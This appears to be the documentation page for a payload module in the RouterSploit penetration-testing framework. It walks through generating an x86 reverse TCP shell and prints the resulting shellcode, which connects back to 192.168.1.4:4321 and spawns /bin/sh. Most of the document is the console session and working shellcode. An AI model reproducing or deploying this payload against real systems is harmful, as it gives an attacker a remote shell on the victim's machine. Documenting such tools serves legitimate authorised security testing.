## Description

Module generates payload that creates interactive tcp reverse shell for X86 architecture.

## Verification Steps

  1. Start `./rsf.py`
  2. Do: `use payloads/x86/reverse_tcp`
  3. Do: `set lhost 192.168.1.4`
  4. Do: `set lport 4321`
  5. Module generates x86 reverse shell tcp payload

## Scenarios

```
rsf > use payloads/x86/reverse_tcp
rsf (X86 Reverse TCP) > set lhost 192.168.1.4
[+] lhost => 192.168.1.4
rsf (X86 Reverse TCP) > set lport 4321
[+] lport => 4321
rsf (X86 Reverse TCP) > run
[*] Running module...
[*] Generating payload
[+] Building payload for python
payload = (
    "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
    "\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x01\x04\x68"
    "\x02\x00\x10\xe1\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
    "\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
    "\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
)
```
